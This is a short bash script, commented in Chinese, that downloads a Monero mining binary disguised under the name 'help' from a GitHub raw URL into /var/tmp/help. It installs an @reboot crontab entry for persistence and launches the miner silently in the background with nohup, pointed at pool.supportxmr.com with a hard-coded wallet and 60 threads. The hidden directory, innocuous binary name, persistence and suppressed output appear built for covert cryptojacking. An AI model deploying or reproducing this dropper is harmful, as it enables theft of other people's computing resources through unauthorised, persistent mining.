#!/bin/bash

# 设置默认变量
WALLET="43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE"
POOL="pool.supportxmr.com:3333"
THREADS="60"
WORKER="worker"
MINER_DIR="/var/tmp/help"
MINER_URL="https://github.com/dadashabi123/shabi/raw/refs/heads/main/help"

# 解析命令行参数
while getopts "w:" opt; do
  case $opt in
    w)
      WORKER="$OPTARG"
      ;;
    \?)
      echo "无效的选项: -$OPTARG" >&2
      exit 1
      ;;
  esac
done

# 创建目录
mkdir -p "$MINER_DIR"
cd "$MINER_DIR"

# 下载挖矿程序
if command -v wget >/dev/null 2>&1; then
    wget -O help "$MINER_URL"
elif command -v curl >/dev/null 2>&1; then
    curl -o help "$MINER_URL"
else
    echo "错误: 未找到 wget 或 curl 命令"
    exit 1
fi

chmod +x help

# 设置crontab
(crontab -l 2>/dev/null; echo "@reboot cd $MINER_DIR && nohup ./help -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER --donate-level=0 -B >/dev/null 2>&1 &") | crontab -

# 立即启动挖矿
cd "$MINER_DIR"
nohup ./help -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER" --donate-level=0 -B >/dev/null 2>&1 &

# 检查进程是否运行
sleep 2
if pgrep -f "help.*$POOL" > /dev/null; then
    echo "挖矿程序已成功启动"
    echo "矿工名称: $WORKER"
else
    echo "挖矿程序启动失败"
fi 
